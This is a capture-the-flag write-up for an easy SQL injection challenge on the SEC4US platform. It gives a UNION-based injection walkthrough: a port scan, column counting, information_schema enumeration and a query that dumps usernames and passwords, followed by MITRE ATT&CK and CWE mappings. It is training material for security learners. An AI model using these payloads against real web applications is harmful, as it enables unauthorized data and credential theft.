# maq102: Servidor de Publicacoes em Latim

Writeup for the **Servidor de Publicacoes em Latim** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** SQL Injection  
> **Difficulty:** Easy  
> **Points:** 102

---

## Overview

A publications server renders content from a database using unsanitized user input in SQL queries. UNION-based SQL injection allows extracting database contents, including credentials and the flag.

## Reconnaissance

Scan the target:

```bash
nmap -sC -sV -p- <TARGET_IP>
```

Browse the web application and identify dynamic parameters that query the database. Look for URL parameters like `?id=1` or form inputs that display records.

## Exploitation

### Step 1: Identify the Injection Point

Test parameters with a single quote to trigger SQL errors:

```
http://<TARGET_IP>/page?id=1'
```

Observe error messages that reveal the database type (MySQL, PostgreSQL, etc.).

### Step 2: Determine Column Count

Use ORDER BY to find the number of columns:

```
?id=1 ORDER BY 1-- -
?id=1 ORDER BY 5-- -
```

### Step 3: UNION-Based Extraction

Craft a UNION SELECT to extract data:

```
?id=-1 UNION SELECT 1,2,3,4-- -
```

Identify which columns are reflected in the output.

### Step 4: Extract Database Information

Enumerate databases, tables, and columns:

```sql
UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -
```

### Step 5: Dump Credentials and Flag

Extract the target table contents:

```sql
UNION SELECT 1,group_concat(username,0x3a,password),3,4 FROM users-- -
```

### Step 6: Retrieve the Flag

Read the flag from the database or use obtained credentials to access the system.

## Security Framework Mapping

### MITRE ATT&CK

| Technique                         | ID        |
|-----------------------------------|-----------|
| Exploit Public-Facing Application | T1190     |
| Unsecured Credentials             | T1552     |
| Data from Information Repositories | T1213    |

### CWE

- **CWE-89:** Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
- **CWE-209:** Generation of Error Message Containing Sensitive Information

---

Latin may be a dead language, but the queries behind this server are very much alive; they speak fluent UNION SELECT to anyone willing to listen.

```
(❍ᴥ❍ʋ)
```

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
